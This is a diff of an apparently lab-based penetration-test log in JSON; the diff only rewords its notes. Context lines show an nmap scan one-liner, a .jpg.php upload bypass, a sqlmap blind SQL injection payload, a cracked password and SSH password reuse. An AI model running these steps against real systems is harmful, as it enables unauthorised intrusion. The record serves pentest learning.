@@ -73,7 +73,7 @@
           "command_executed": "ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.18 | grep '^[0-9]' | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//)",
           "output_snippet": "22/tcp open\n80/tcp open",
           "success": true,
-          "notes": "Common certification pattern: save open ports to variable for detailed scan. The port filtering with grep/cut/tr/sed is standard methodology."
+          "notes": "Common common pattern: save open ports to variable for detailed scan. The port filtering with grep/cut/tr/sed is standard methodology."
         },
         {
           "command_id": "nmap-service-scan",
@@ -170,7 +170,7 @@
           "severity": "critical",
           "exploitability": "medium",
           "technique": "Extension filter bypass via double extension (.jpg.php)",
-          "notes": "Well-documented CVE with public PoCs available. Manual exploitation preferred for certification learning."
+          "notes": "Well-documented CVE with public PoCs available. Manual exploitation preferred for pentest learning."
         }
       ],
       "commands_used": [
@@ -212,7 +212,7 @@
           },
           "success": false,
           "error": "WARNING: POST parameter 'email' does not seem to be injectable\nCRITICAL: all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk'",
-          "notes": "DEFAULT LEVEL INSUFFICIENT - this is critical certification learning point. Sqlmap suggestion to increase --level was key to success."
+          "notes": "DEFAULT LEVEL INSUFFICIENT - this is critical learning point. Sqlmap suggestion to increase --level was key to success."
         },
         {
           "command_id": "sqlmap-from-request-level3",
@@ -229,7 +229,7 @@
             "title": "AND boolean-based blind - WHERE or HAVING clause (subquery - comment)",
             "payload_example": "_token=...&email=test' AND 2244=(SELECT (CASE WHEN (2244=2244) THEN 2244 ELSE (SELECT 5858 UNION SELECT 3175) END))-- cBAs"
           },
-          "notes": "Success! --level 3 enables more thorough injection tests. certification LESSON: Trust manual verification over tool defaults."
+          "notes": "Success! --level 3 enables more thorough injection tests. LESSON: Trust manual verification over tool defaults."
         },
         {
           "command_id": "sqlmap-enumerate-databases",
@@ -294,7 +294,7 @@
           "time_taken": "8 seconds",
           "password_cracked": "whatever1",
           "output_snippet": "whatever1        (?)\n1g 0:00:00:08 DONE (2024-08-07 05:56) 0.1123g/s 182.0p/s",
-          "notes": "Weak password cracked quickly. certification TIP: Always try rockyou first before custom wordlists."
+          "notes": "Weak password cracked quickly. PRACTICAL TIP: Always try rockyou first before custom wordlists."
         },
         {
           "command_id": "web-login-admin-panel",
@@ -420,7 +420,7 @@
           "lesson_learned": "CRITICAL pentest LESSON: Automated tools have limitations. Always trust manual verification (which confirmed SQLi) over tool defaults. Sqlmap --level flag is often required for blind injections. Read tool suggestions carefully.",
           "time_wasted_minutes": 15,
           "documentation_importance": "high",
-          "notes": "This is a common certification exam scenario: blind SQLi that requires increased sqlmap sensitivity. Document this pattern for future reference."
+          "notes": "This is a common pentest scenario: blind SQLi that requires increased sqlmap sensitivity. Document this pattern for future reference."
         },
         {
           "attempt": "Direct upload of shell.php without extension modification",
@@ -497,7 +497,7 @@
           "password_tried": "3nc0d3d_pa$$w0rd",
           "success": true,
           "output": "uid=1001(xander) gid=1001(xander) groups=1001(xander)",
-          "notes": "PASSWORD REUSE SUCCESS! Classic certification pattern."
+          "notes": "PASSWORD REUSE SUCCESS! Classic common pattern."
         },
         {
           "command_id": "ssh-connect-password",
